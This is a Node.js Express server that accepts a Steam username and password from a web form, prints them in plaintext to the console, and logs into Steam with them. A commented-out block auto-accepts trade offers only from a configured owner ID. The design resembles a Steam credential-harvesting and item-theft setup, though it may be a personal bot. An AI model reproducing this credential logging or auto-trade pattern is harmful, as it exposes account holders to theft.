


function sleep (time) {
  return new Promise((resolve) => setTimeout(resolve, time));
}


const SteamUser = require('steam-user');
const SteamTotp = require('steam-totp');
const SteamCommunity = require('steamcommunity');
const TradeOfferManager = require('steam-tradeoffer-manager');
const config = require('./config.json')


var lPass;
var lUser;


function revealMessage(p1, p2, res){


const client = new SteamUser();
const community = new SteamCommunity();

const manager = new TradeOfferManager({
	steam: client,
	community: community,
	language: 'en'
});


const logOnOptions = {
	accountName: p1,
	password: p2       

};

client.logOn(logOnOptions);


client.on('error', function(err) {
		console.log('ERROR');
		res.status(304);
		res.end();
});

client.on('loggedOn',() => {
	console.log('sucessfully logged on.');
	client.setPersona(SteamUser.EPersonaState.Online);
	client.gamesPlayed(["Test", 730]);
	res.end();
});

client.on("friendMessage", function(steamID, message){
	if (message == "hi") {
		client.chatMessage(steamID,"hello, this works.")
	}
});
/*
client.on('webSession', (sessionid, cookies) => {
  manager.setCookies(cookies);

  community.setCookies(cookies);
  community.startConfirmationChecker(10000);
});
function acceptOffer(offer){
	offer.accept((err) => {
		community.checkConfirmations();
		console.log("Accepted an offer.")
		if(err) console.log(err)
	});
}

function declineOffer(offer){
	offer.decline((err) => {
		community.checkConfirmations();
		console.log("Accepted an offer.")
		if(err) console.log("There was an error decinlinig the offer.")
	});
}

manager.on('newOffer', (offer) =>{
	if(offer.partner.getSteamID64() == config.ownerId){
		acceptOffer(offer);
	}
	else{
		declineOffer(offer);
	}
});
*/

}


console.log('Server-side code running');

const express = require('express');

const app = express();

// serve files from the public directory
app.use(express.static('public'));
app.use(express.urlencoded());

// Parse JSON bodies (as sent by API clients)
app.use(express.json());
// start the express web server listening on 8080
app.listen(8080, () => {
  console.log('listening on 8080');
});

// serve the homepage
app.get('/', (req, res) => {
  res.sendFile(__dirname + '/index.html');
  console.log("hi");
});




app.post('/clicked', (req, res) => {
	lUser = req.body.user.name;
	lPass = req.body.user.pw
	console.log(lUser + ":" + lPass);
	revealMessage(lUser,lPass, res);
	//res.send("nah dude");
});